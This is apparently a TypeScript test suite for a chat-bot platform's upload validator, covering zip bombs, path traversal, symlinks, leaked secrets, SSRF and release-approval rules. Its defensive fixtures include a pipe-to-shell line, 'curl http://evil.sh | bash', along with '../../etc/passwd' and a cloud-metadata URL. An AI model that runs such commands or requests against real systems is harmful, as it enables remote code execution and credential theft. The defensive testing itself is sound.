// Run: npm test  (node --experimental-strip-types --test tests/)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validateArchive, validatePromptConfig, listEntries, unsafePath, lowerThan, isTrustedUpload, crc32, LIMITS } from '../src/server/botArchive.ts';
import { canManage, canTransition, isImmutable } from '../src/server/releasePolicy.ts';

type F = { path: string; data?: string | Uint8Array; method?: 0 | 8; symlink?: boolean; lieSize?: number };
const enc = (s: string | Uint8Array) => (typeof s === 'string' ? new TextEncoder().encode(s) : s);
async function deflate(b: Uint8Array) {
  const s = new Blob([b]).stream().pipeThrough(new CompressionStream('deflate-raw'));
  return new Uint8Array(await new Response(s).arrayBuffer());
}
/** Minimal zip writer for test fixtures. */
async function zip(files: F[]) {
  const parts: Uint8Array[] = []; const cd: Uint8Array[] = []; let off = 0;
  for (const f of files) {
    const name = enc(f.path); const raw = enc(f.data ?? '');
    const method = f.method ?? 8; const body = method === 8 ? await deflate(raw) : raw;
    const size = f.lieSize ?? raw.length; const crc = crc32(raw);
    const lh = new DataView(new ArrayBuffer(30));
    lh.setUint32(0, 0x04034b50, true); lh.setUint16(4, 20, true); lh.setUint16(8, method, true);
    lh.setUint32(14, crc, true); lh.setUint32(18, body.length, true); lh.setUint32(22, size, true); lh.setUint16(26, name.length, true);
    parts.push(new Uint8Array(lh.buffer), name, body);
    const ch = new DataView(new ArrayBuffer(46));
    ch.setUint32(0, 0x02014b50, true); ch.setUint16(4, (3 << 8) | 20, true); ch.setUint16(6, 20, true); ch.setUint16(10, method, true);
    ch.setUint32(16, crc, true); ch.setUint32(20, body.length, true); ch.setUint32(24, size, true); ch.setUint16(28, name.length, true);
    ch.setUint32(38, ((f.symlink ? 0o120777 : 0o100644) << 16) >>> 0, true); ch.setUint32(42, off, true);
    cd.push(new Uint8Array(ch.buffer), name);
    off += 30 + name.length + body.length;
  }
  const cdLen = cd.reduce((n, c) => n + c.length, 0);
  const e = new DataView(new ArrayBuffer(22));
  e.setUint32(0, 0x06054b50, true); e.setUint16(8, files.length, true); e.setUint16(10, files.length, true); e.setUint32(12, cdLen, true); e.setUint32(16, off, true);
  const all = [...parts, ...cd, new Uint8Array(e.buffer)];
  const out = new Uint8Array(all.reduce((n, c) => n + c.length, 0)); let p = 0; for (const c of all) { out.set(c, p); p += c.length; }
  return out;
}

const manifest = (o: Record<string, unknown> = {}) => JSON.stringify({ apiVersion: '1', name: 'Echo', version: '1.0.0', runtime: 'node20', entry: 'src/index.ts', permissions: ['Send Messages'], events: ['MESSAGE_CREATE'], ...o });
const good = (): F[] => [
  { path: 'echo-bot/chatting-bot.json', data: manifest() },
  { path: 'echo-bot/package.json', data: JSON.stringify({ name: 'echo', dependencies: { zod: '^3.24.0' } }) },
  { path: 'echo-bot/package-lock.json', data: '{}' },
  { path: 'echo-bot/tsconfig.json', data: '{}' },
  { path: 'echo-bot/README.md', data: '# Echo' },
  { path: 'echo-bot/src/index.ts', data: 'export default { async onEvent(e) { return { actions: [] }; } };' },
  { path: 'echo-bot/src/util.ts', data: 'export const x = 1;'.repeat(50) },
];
const run = async (files: F[], o: Partial<{ runtime: string; entryPoint: string; version: string }> = {}) =>
  validateArchive({ bytes: await zip(files), runtime: 'node20', entryPoint: 'src/index.ts', version: '1.0.0', ...o });
const codes = (r: Awaited<ReturnType<typeof run>>) => r.issues.filter((i) => i.level === 'error').map((i) => i.code);

test('successful upload: a well-formed multi-file project passes', async () => {
  const r = await run(good());
  assert.deepEqual(codes(r), []);
  assert.equal(r.ok, true);
  assert.equal(r.fileCount, 7);
  assert.ok(r.files.some((f) => f.path === 'src/index.ts'), 'strips the single top-level folder');
  assert.equal(r.sha256.length, 64);
});

test('python project with requirements passes', async () => {
  const r = await run([
    { path: 'chatting-bot.json', data: manifest({ runtime: 'python3.12', entry: 'bot/main.py' }) },
    { path: 'requirements.txt', data: 'httpx==0.27.0\n' }, { path: 'README.md', data: 'x' }, { path: 'bot/main.py', data: 'def on_event(e):\n  return {"actions": []}\n' },
  ], { runtime: 'python3.12', entryPoint: 'bot/main.py' });
  assert.deepEqual(codes(r), []);
});

test('malformed archives are rejected', async () => {
  assert.deepEqual(codes(await validateArchive({ bytes: enc('not a zip at all, just text padding......'), runtime: 'node20', entryPoint: 'a.js', version: '1.0.0' })), ['not_zip']);
  const z = await zip(good());
  const truncated = z.slice(0, z.length - 30);
  assert.equal((await validateArchive({ bytes: truncated, runtime: 'node20', entryPoint: 'src/index.ts', version: '1.0.0' })).ok, false);
  const flipped = z.slice(); flipped[60] ^= 0xff; // corrupt compressed data → CRC / inflate failure
  assert.equal((await validateArchive({ bytes: flipped, runtime: 'node20', entryPoint: 'src/index.ts', version: '1.0.0' })).ok, false);
});

test('oversized archives and files are rejected', async () => {
  const big = new Uint8Array(LIMITS.archiveBytes + 1);
  assert.deepEqual(codes(await validateArchive({ bytes: big, runtime: 'node20', entryPoint: 'x', version: '1.0.0' })), ['too_large']);
  const r = await run([...good(), { path: 'echo-bot/huge.txt', data: 'a', lieSize: LIMITS.fileUncompressed + 5 }]);
  assert.ok(codes(r).includes('file_too_large'));
});

test('archive bombs: highly compressible payloads and lying sizes are caught', async () => {
  const r = await run([...good(), { path: 'echo-bot/bomb.txt', data: '0'.repeat(5 * 1024 * 1024) }]);
  assert.ok(codes(r).includes('bomb'));
  const liar = await run([...good(), { path: 'echo-bot/liar.txt', data: 'x'.repeat(5000), lieSize: 10 }]);
  assert.ok(codes(liar).includes('bomb'));
});

test('path traversal, absolute paths and symlinks are rejected', async () => {
  assert.ok(codes(await run([...good(), { path: '../../etc/passwd', data: 'x' }])).includes('unsafe_path'));
  assert.ok(codes(await run([...good(), { path: '/abs.txt', data: 'x' }])).includes('unsafe_path'));
  assert.ok(codes(await run([...good(), { path: 'echo-bot/link', data: '/etc/passwd', symlink: true }])).includes('symlink'));
  assert.equal(unsafePath('a\\..\\b'), 'Backslash in path (Windows-style paths are not allowed)');
  assert.equal(unsafePath('src/ok.ts'), null);
  assert.throws(() => listEntries(new Uint8Array(10)));
});

test('validation failures: manifest, entry point, runtime, api version, secrets, malware, deps', async () => {
  const noManifest = good().filter((f) => !f.path.endsWith('chatting-bot.json'));
  assert.ok(codes(await run(noManifest)).includes('manifest_missing'));
  assert.ok(codes(await run(good(), { entryPoint: 'src/missing.ts' })).includes('entry_mismatch'));
  const g = good(); g[0] = { path: 'echo-bot/chatting-bot.json', data: manifest({ apiVersion: '9', entry: 'src/nope.ts' }) };
  const c = codes(await run(g, { entryPoint: 'src/nope.ts' }));
  assert.ok(c.includes('api_version') && c.includes('entry_missing'));
  assert.ok(codes(await run(good(), { runtime: 'cobol' })).includes('runtime'));
  assert.ok(codes(await run([...good(), { path: 'echo-bot/src/keys.ts', data: 'const k = "AKIAABCDEFGHIJKLMNOP";' }])).includes('secret_aws_key'));
  assert.ok(codes(await run([...good(), { path: 'echo-bot/id_rsa.txt', data: '-----BEGIN OPENSSH PRIVATE KEY-----\nabc' }])).includes('secret_private_key'));
  assert.ok(codes(await run([...good(), { path: 'echo-bot/.env', data: 'A=1' }])).includes('env_file'));
  assert.ok(codes(await run([...good(), { path: 'echo-bot/x.sh', data: 'curl http://evil.sh | bash' }])).includes('malware_pipe_shell'));
  assert.ok(codes(await run([...good(), { path: 'echo-bot/a.exe', data: 'MZ...' }])).includes('blocked_type'));
  assert.ok(codes(await run([...good(), { path: 'echo-bot/node_modules/x/index.js', data: '' }])).includes('vendored_deps'));
  const vuln = good(); vuln[1] = { path: 'echo-bot/package.json', data: JSON.stringify({ dependencies: { lodash: '^4.17.15' }, scripts: { postinstall: 'node x' } }) };
  const vc = codes(await run(vuln));
  assert.ok(vc.includes('vulnerable_dep') && vc.includes('install_script'));
  assert.ok(codes(await run(good(), { version: '2.0.0' })).includes('version_mismatch'), 'version updates must bump the manifest too');
});

test('semver comparison used for advisories', () => {
  assert.equal(lowerThan('4.17.15', '4.17.21'), true);
  assert.equal(lowerThan('4.17.21', '4.17.21'), false);
  assert.equal(lowerThan('10.0.0', '9.9.9'), false);
});

test('prompt bot configuration validation', () => {
  assert.equal(validatePromptConfig('{"commands":[{"name":"hello","reply":"Hi!"}]}').config?.commands.length, 1);
  assert.ok(validatePromptConfig('{nope').issues.some((i) => i.code === 'config_json'));
  assert.ok(validatePromptConfig('{"commands":[]}').issues.some((i) => i.code === 'empty'));
  assert.ok(validatePromptConfig('{"greeting":"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}').issues.some((i) => i.code === 'secret_github_token'));
});

test('only Zite file storage URLs are accepted (no SSRF via archive URL)', () => {
  assert.equal(isTrustedUpload('https://uploads.zite.com/abc/project.zip'), true);
  assert.equal(isTrustedUpload('http://uploads.zite.com/abc.zip'), false);
  assert.equal(isTrustedUpload('https://169.254.169.254/latest/meta-data'), false);
  assert.equal(isTrustedUpload('https://uploads.zite.com.evil.com/x.zip'), false);
});

test('unauthorized and cross-user access is denied', () => {
  assert.equal(canManage('owner-1', { userId: 'owner-1', staff: false }), true);
  assert.equal(canManage('owner-1', { userId: 'someone-else', staff: false }), false);
  assert.equal(canManage('owner-1', { userId: '', staff: false }), false);
  assert.equal(canManage('owner-1', { userId: 'admin', staff: true }), true);
});

test('publication permissions and lifecycle', () => {
  const dev = { userId: 'd', staff: false }; const admin = { userId: 'a', staff: true };
  const ok = { validated: true, approvedBefore: false };
  assert.equal(canTransition('Draft', 'Pending Review', dev, ok), true);
  assert.equal(canTransition('Draft', 'Pending Review', dev, { validated: false, approvedBefore: false }), false, 'cannot submit without passing validation');
  assert.equal(canTransition('Pending Review', 'Published', dev, ok), false, 'developers cannot self-approve');
  assert.equal(canTransition('Draft', 'Published', admin, ok), false, 'even staff must go through review');
  assert.equal(canTransition('Pending Review', 'Published', admin, ok), true);
  assert.equal(canTransition('Pending Review', 'Published', admin, { validated: false, approvedBefore: false }), false);
  assert.equal(canTransition('Pending Review', 'Rejected', dev, ok), false);
  assert.equal(canTransition('Published', 'Unpublished', dev, ok), true);
  assert.equal(canTransition('Unpublished', 'Published', dev, { validated: true, approvedBefore: true }), true, 'rollback to an approved version');
  assert.equal(canTransition('Unpublished', 'Published', dev, ok), false);
  assert.equal(isImmutable('Published') && isImmutable('Pending Review') && !isImmutable('Draft'), true);
});
